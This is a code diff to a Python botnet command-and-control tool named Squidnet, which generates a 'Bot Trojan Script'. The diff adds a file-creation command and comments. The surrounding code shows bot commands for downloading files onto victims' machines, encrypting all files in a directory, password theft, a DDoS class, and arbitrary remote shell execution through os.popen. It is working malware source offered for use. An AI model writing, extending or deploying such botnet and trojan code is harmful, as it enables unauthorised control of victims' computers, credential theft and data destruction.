@@ -3,12 +3,16 @@ from cryptography.fernet import Fernet
 from optparse import OptionParser
 class ArguementParse:
     def __init__(self):
+        """If there are less than 2 arguements the option-parsing
+        message will be displayed. Otherwise it will try to
+        parse the arguements."""
         if len(sys.argv) < 2:
             self.usage()
         else:
             self.get_args()
     def downloadNgrok(self):
-        """Downloads Ngrok for windows."""
+        """Downloads Ngrok for windows. May need to add it for other OS's
+        but maybe in the future I will."""
         print("[+] Downloading Ngrok.....\n")
         if sys.platform == "win32":
             batfile = open("getNgrok.bat","w")
@@ -66,7 +70,9 @@ TCP and SSH Botnet Hybrid Command and Control Server By DrSquid
 [+] Squidnet --gN""")
         sys.exit()
     def get_args(self):
-        """Arguement Parsing function for initiating the Botnet."""
+        """Arguement Parsing function for initiating the Botnet. Also adds
+        a bit of info for configuring settings in the Botnet to function the
+        best way that it can."""
         opt = OptionParser()
         opt.add_option("--ip", "--ipaddr", dest="ip")
         opt.add_option("--p", "--port", dest="port")
@@ -239,6 +245,7 @@ TCP and SSH Botnet Hybrid Command and Control Server By DrSquid""")
         print("[+] !dwnldfile [src] [file]      - Downloads a file from the internet onto the bot computer.")
         print("[+] !mkdir [dir]                 - Makes a folder in the bot current directory.")
         print("[+] !gotowebsite [url]           - Takes the bot to the provided website.")
+        print("[+] !mkfile [filename]           - Creates a file in the bot working directory.")
         print("[+] !editfile [file]             - Opens a file in writing mode for the bots.")
         print("[+] !stopedit                    - Closes file editor on bots and returns to normal.")
         print("[+] !encdir                      - Encrypts all files in the bot working directory")
@@ -350,6 +357,7 @@ TCP and SSH Botnet Hybrid Command and Control Server By DrSquid""")
 [+] !dwnldfile [src] [file]      - Downloads a file from the internet onto the bot computer.
 [+] !mkdir [dir]                 - Makes a folder in the bot current directory.
 [+] !gotowebsite [url]           - Takes the bot to the provided website.
+[+] !mkfile [filename]           - Creates a file in the bot working directory.
 [+] !editfile [file]             - Opens a file in writing mode for the bots.
 [+] !stopedit                    - Closes file editor on bots and returns to normal.
 [+] !encdir                      - Encrypts all files in the bot working directory
@@ -767,6 +775,7 @@ TCP and SSH Botnet Hybrid Command and Control Server By DrSquid""")
 [+] - Added Password Obtaining on the Bot Scripts
 [+] - Fixed Typo in What's new in section 3.
 [+] - Added Bot file editing.
+[+] - Added Bot file creation.
                     """)
                 if self.instruction != "!clear":
                     self.send_ssh(self.instruction)
@@ -857,20 +866,23 @@ admin = BotMaster('""" + self.ngroklink + """',""" + str(
         return script
     def bot_script(self):
         """Generates the Bot Trojan Script needed to connect to this server and run commands from it.
-        Test it and see what it does!"""
+        Test it and see what it does! It will respond to all commands, and it will do either any of
+        the in-built commands or run any other instructions with command prompt/terminal."""
         script = """
-
 import socket, time, os, threading, urllib.request, shutil, sys, random, base64, sqlite3, json
 import subprocess, re
 try:
-    import win32crypt
+    import win32crypt # pip install pypiwin32
 except:
     pass
 try:
-    from cryptography.fernet import Fernet
+    from cryptography.fernet import Fernet # pip install cryptography
 except:
     pass
-from Crypto.Cipher import AES
+try:
+    from Crypto.Cipher import AES # pip install pycryptodome
+except:
+    pass
 import shutil
 
 class DDoS:
@@ -4535,6 +4547,15 @@ OS:       {sys.platform}
                 except:
                     self.send("File cannot be opened on this computer.".encode())
                     self.fileeditor = False
+            elif self.msg.startswith("!mkfile"):
+                msg_split = self.msg.split()
+                try:
+                    filename = msg_split[1]
+                    file = open(str(filename),"w")
+                    file.close()
+                    self.send(f"File {filename} has been created in {os.getcwd()}".encode())
+                except:
+                    self.send("Error with creating files.".encode())
             else:
                 output = os.popen(self.msg).read()
                 self.send(output)
